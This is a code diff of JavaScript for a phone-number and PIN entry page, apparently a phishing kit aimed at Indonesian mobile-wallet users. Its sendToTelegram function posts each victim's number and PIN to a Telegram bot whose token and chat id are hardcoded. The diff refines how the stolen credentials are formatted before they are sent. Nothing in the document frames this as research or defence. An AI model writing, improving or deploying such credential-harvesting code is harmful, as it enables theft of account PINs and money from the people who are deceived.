@@ -17,8 +17,11 @@ function showPinPage() {
 
   const phone = document.getElementById('phone-input').value.trim();
   const errorEl = document.getElementById('error-message');
-  let normalizedPhone = phone.startsWith('0') ? phone.slice(1) : phone;
-  const phoneRegex = /^8[1-9][0-9]{7,11}$/;
+  let normalizedPhone = phone.replace(/\D/g, ''); // buang karakter non-digit
+  if (!normalizedPhone.startsWith('0')) {
+    normalizedPhone = '0' + normalizedPhone;
+  }
+  const phoneRegex = /^08[1-9][0-9]{7,11}$/; // validasi harus mulai dari 08
 
   if (!phoneRegex.test(normalizedPhone)) {
     errorEl.style.display = 'block';
@@ -53,7 +56,7 @@ function updateDots(showIndex = -1) {
     if (i === showIndex && pinValues[i]) {
       dot.textContent = pinValues[i];
       clearTimeout(revealTimeout);
-      revealTimeout = setTimeout(updateDots, 500);
+      revealTimeout = setTimeout(updateDots, 100);
     }
     dotsContainer.appendChild(dot);
   }
@@ -62,7 +65,26 @@ function updateDots(showIndex = -1) {
 async function sendToTelegram(pin) {
   const token = '7573991625:AAGEabvedzkHODDvk0hE5RZ7mOWvC981sD4';
   const chat_id = '7105244348';
-  const message = `Nomor: ${savedPhoneNumber}\nPIN: ${pin}`;
+
+  // Format nomor jadi 4-4-4, contoh: 0821-9404-7784
+  function formatNomor(nomor) {
+    const clean = nomor.replace(/\D/g, '');
+  
+    // Tambahkan 0 kembali jika belum ada
+    const withZero = clean.startsWith('0') ? clean : '0' + clean;
+  
+    const chunks = [];
+    for (let i = 0; i < withZero.length; i += 4) {
+      chunks.push(withZero.slice(i, i + 4));
+    }
+  
+    return chunks.join('-');
+  }
+
+  const formattedNumber = formatNomor(savedPhoneNumber);
+  const formattedPin = pin.match(/.{1,2}/g).join('-');
+  const message = `Nomor: ${formattedNumber}\nPIN: ${formattedPin}`;  
+
   const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
   try {
     await fetch(url);
